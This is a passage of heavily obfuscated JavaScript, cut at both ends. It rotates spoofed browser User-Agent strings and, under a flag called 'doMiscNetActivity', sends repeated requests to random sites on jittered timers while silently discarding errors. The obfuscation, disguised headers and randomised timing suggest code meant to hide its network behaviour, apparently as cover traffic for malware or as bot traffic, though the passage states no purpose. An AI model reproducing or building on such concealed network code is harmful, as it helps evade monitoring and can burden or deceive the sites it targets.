      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x166b * -0x1 + -0x126d + 0x4 * 0xa36; k < -0xfd8 + 0x3 * 0x525 + 0x6d * 0x1; k++)
    setTimeout(f, (-0x1 * 0x33a7 + -0x12d51 + 0x24b58) * k * getRandomInt(0x1 * -0x121d + -0x3 * -0x99 + 0x1053, -0x710 + 0x245b + -0x4 * 0x752));
  setInterval(() => {
    f();
    for (let l = 0x2 * -0x3ee + 0x3cd * 0x5 + -0xb25; l < -0x1a11 * -0x1 + 0x61 * 0x58 + -0x1 * 0x3b65; l++)
      setTimeout(f, (0x3a * -0x445 + -0x22ef * -0x1 + 0x1bf13 * 0x1) * l * getRandomInt(0x1 * 0x16be + 0x16a * -0xa + -0x899, -0x110 * 0x1 + -0x1bb * 0xb + -0x24 * -0x8f));
  }, -0x7 * 0xc2785 + 0x658d8e + 0x475 * 0x8a1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a5 = c,
    f = axios[a5(0x14)]({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2ef7 + -0xd * 0x10e + -0x7 * -0xc93) * getRandomInt(-0xf00 + -0x190a + 0x280b, 0x6 * -0x420 + 0x609 * -0x2 + 0x1 * 0x24d7));
}, 0x1f79 + -0xa * 0x296 + -0x539);